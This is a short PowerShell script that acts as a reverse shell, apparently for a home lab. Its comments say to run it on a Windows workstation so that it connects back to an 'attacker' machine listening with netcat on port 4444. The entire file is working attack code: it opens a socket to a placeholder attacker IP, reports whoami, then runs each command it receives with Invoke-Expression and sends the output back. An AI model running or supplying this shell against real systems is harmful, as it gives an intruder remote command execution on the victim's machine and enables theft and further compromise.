# Run on the Windows workstation.
# Connects back to the Ubuntu attacker with rlwrap nc -lvnp 4444.

# >>> EDIT THESE <<<
$AttackerIP = "192.168.x.x"
$Port       = 4444

$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($AttackerIP, $Port)

$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

$writer.WriteLine((whoami))

while ($client.Connected) {
    $cmd = $reader.ReadLine()
    if ($null -eq $cmd -or $cmd -eq "exit") { break }

    try   { $output = Invoke-Expression $cmd 2>&1 | Out-String }
    catch { $output = "ERROR: $_" }

    $writer.WriteLine($output)
    $writer.WriteLine("PS> ")
}

$client.Close()